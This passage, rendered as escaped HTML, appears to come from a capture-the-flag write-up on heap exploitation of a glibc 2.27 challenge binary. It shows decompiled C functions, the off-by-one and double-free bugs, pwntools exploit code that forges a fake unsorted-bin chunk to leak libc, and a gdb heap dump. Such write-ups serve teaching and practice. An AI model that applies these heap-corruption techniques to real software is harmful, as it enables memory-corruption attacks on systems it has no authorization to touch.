    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; puts(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_14D0);
  examined &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Choose an index: &amp;#34;&lt;/span&gt;);
  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lu&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v1);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( size_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; alloc_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; v1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE&lt;/span&gt; )
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; puts((&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)alloc_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1]);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] Invalid!&amp;#34;&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally we can malloc a huge chunk, but we cannot wriet anything within:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;savebig&lt;/span&gt;()
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v0; &lt;span style=&#34;color:#75715e&#34;&gt;// rax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  size_t size; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+8h] [rbp-8h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( chungus_weapon &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; qword_202068 )
  {
    LODWORD(v0) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; puts(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_16E8);
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
  {
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;How much space do you need for this massive weapon: &amp;#34;&lt;/span&gt;);
    __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lu&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;size);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int16&lt;/span&gt;)size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5AFu&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int16&lt;/span&gt;)size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF5C0u&lt;/span&gt; )
    {
      puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Adding to your inventory..&amp;#34;&lt;/span&gt;);
      chungus_weapon &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; size;
      v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; malloc(size);
      qword_202068 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)v0;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
    {
      LODWORD(v0) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[-] This is not possible..&amp;#34;&lt;/span&gt;);
    }
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)v0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h1&gt;
&lt;h2 id=&#34;what-we-have&#34;&gt;What we have&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;An off-by-one when we create a new chunk&lt;/li&gt;
&lt;li&gt;Double free by calling &lt;code&gt;fix&lt;/code&gt; and then providing an invalid size.&lt;/li&gt;
&lt;li&gt;Trivial read after free thanks to the double free.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;restrictions&#34;&gt;Restrictions&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;The program does not use &lt;code&gt;printf&lt;/code&gt; with a format specifer, then we cannot do a &lt;a href=&#34;https://maxwelldulin.com/BlogPost?post=3107454976&#34;&gt;House of husk&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;We can only allocate &lt;code&gt;15&lt;/code&gt; chunks.&lt;/li&gt;
&lt;li&gt;All the allocations except the big one are made using &lt;code&gt;calloc&lt;/code&gt;, even if it can be easily bypassed by adding the &lt;code&gt;IS_MAPPED&lt;/code&gt; flag to the chunk header to avoid zero-ing.&lt;/li&gt;
&lt;li&gt;The libc version (&lt;code&gt;2.27&lt;/code&gt;) mitigates a few techniques, especially the &lt;a href=&#34;https://1ce0ear.github.io/2017/11/26/study-house-of-orange/&#34;&gt;House of Orange&lt;/a&gt; and introduces the &lt;code&gt;tcache&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Allocations have to fit in only two fastbins (&lt;code&gt;0x30&lt;/code&gt; / &lt;code&gt;0x40&lt;/code&gt;), which means we cannot get an arbitrary with a &lt;code&gt;fastbin dup&lt;/code&gt; technique due to the size of most of interesting memory areas in the libc (&lt;code&gt;0x7f&lt;/code&gt; =&amp;gt; &lt;code&gt;0x70&lt;/code&gt; fastbin against &lt;code&gt;0x30&lt;/code&gt; / &lt;code&gt;0x40&lt;/code&gt; in our case).&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;how-to-leak-libc-&#34;&gt;How to leak libc ?&lt;/h2&gt;
&lt;p&gt;Partial overwrites are as far as I know very hard to get because of &lt;code&gt;calloc&lt;/code&gt;. The first thing to do is to leak libc addresses to then target libc global variables / structures. The classic way to get a libc leak is to free a chunk that belongs to the unsorted bin and then print it. But as seen previously, we cannot allocate a large chunks that would end up in the unsorted bin. To do so we have to use the off-by-one bug to overwrite the next chunk&amp;rsquo;s size field with a bigger one that would correspond to the unsorted bin (&lt;code&gt;&amp;gt;= 0x90&lt;/code&gt;). We can edit the size of the second chunk from &lt;code&gt;0x30&lt;/code&gt; to &lt;code&gt;0xb0&lt;/code&gt; by doing:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;(idx, size, data, hang&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;):
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt;&amp;gt; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Choose an index: &amp;#34;&lt;/span&gt;, str(idx)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;How much space do you need for it: &amp;#34;&lt;/span&gt;, str(size)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; hang &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;

    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input your weapon&amp;#39;s details: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, data)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;freexalloc&lt;/span&gt;(idx, size, data, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;):
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt;&amp;gt; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Choose an index: &amp;#34;&lt;/span&gt;, str(idx)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;How much space do you need for this repair: &amp;#34;&lt;/span&gt;, str(size)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; doubleFree:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;

    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input your weapon&amp;#39;s details: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, data)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt;&amp;gt; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;show&lt;/span&gt;(idx):
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt;&amp;gt; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Choose an index: &amp;#34;&lt;/span&gt;, str(idx)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;allochuge&lt;/span&gt;(size):
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt;&amp;gt; &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;4&amp;#34;&lt;/span&gt;)
    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;How much space do you need for this massive weapon: &amp;#34;&lt;/span&gt;, str(size)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())

&lt;span style=&#34;color:#75715e&#34;&gt;# get libc leak&lt;/span&gt;

add(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;)
add(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;B&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;)
add(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# size&lt;/span&gt;
add(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;D&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;))
add(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;E&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;)

add(&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x21&lt;/span&gt;)) &lt;span style=&#34;color:#75715e&#34;&gt;# barrier&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# freexalloc(5, 560, b&amp;#34;&amp;#34;, doubleFree=True)&lt;/span&gt;

freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)

freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
add(&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# fake unsorted chunk&lt;/span&gt;

&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608560:	0x0000000000000000	0x0000000000000041 [0]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608570:	0x00005555556085a0	0x4141414141414141
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608580:	0x4141414141414141	0x4141414141414141
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608590:	0x4141414141414141	0x4141414141414141
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085a0:	0x0a41414141414141	0x0000000000000041 [1]
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085b0:	0x0000000000000000	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085c0:	0x0000000000000000	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085d0:	0x0000000000000000	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085e0:	0x0000000000000000	0x00000000000000b1 [2] &amp;lt;- Fake size | PREV_INUSE (1)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556085f0:	0x0000000000000000	0x4343434343434343	 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608600:	0x4343434343434343	0x4343434343434343	 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608610:	0x0a43434343434343	0x0000000000000041 [3]	 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608620:	0x4444444444444444	0x4444444444444444	 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608630:	0x000000000000000a	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608640:	0x0000000000000000	0x0000000000000000	 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608650:	0x0000000000000000	0x0000000000000031 [4]	 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608660:	0x4545454545454545	0x4545454545454545	 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608670:	0x4545454545454545	0x4545454545454545	 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608680:	0x0a45454545454545	0x0000000000000031 [10]	 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x555555608690:	0x0000000000000000	0x0000000000000021 &amp;lt;- Fake chunk header 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556086a0:	0x000000000000000a	0x0000000000000000
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x5555556086b0:	0x0000000000000000	0x0000000000020951 &amp;lt;- Top chunk
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;fastbins
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x30: 0x5555556085e0 ◂— 0x0
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x40: 0x555555608560 —▸ 0x5555556085a0 ◂— 0x0
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We allocate 6 chunks, we do need of 6 chunks because of the fake size we write on &lt;code&gt;chunk_2&lt;/code&gt; (&lt;code&gt;&amp;amp;chunk_2&lt;/code&gt; + &lt;code&gt;0xb0&lt;/code&gt; = &lt;code&gt;0x555555608690&lt;/code&gt;, in the last chunk near the top chunk). In the same way we craft a fake header in the body of the last chunk to avoid issues during the release of &lt;code&gt;chunk_2&lt;/code&gt;. If you&amp;rsquo;re not familiar with the security checks done by &lt;code&gt;malloc&lt;/code&gt; and &lt;code&gt;free&lt;/code&gt;, I would advise you to take a look at &lt;a href=&#34;https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks&#34;&gt;this resource&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Now that &lt;code&gt;chunk_2&lt;/code&gt; has been tampered with a fake &lt;code&gt;0xb0&lt;/code&gt; size, we just have to free it 8 times (to fill the tcache) to put it in the unsorted bin:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
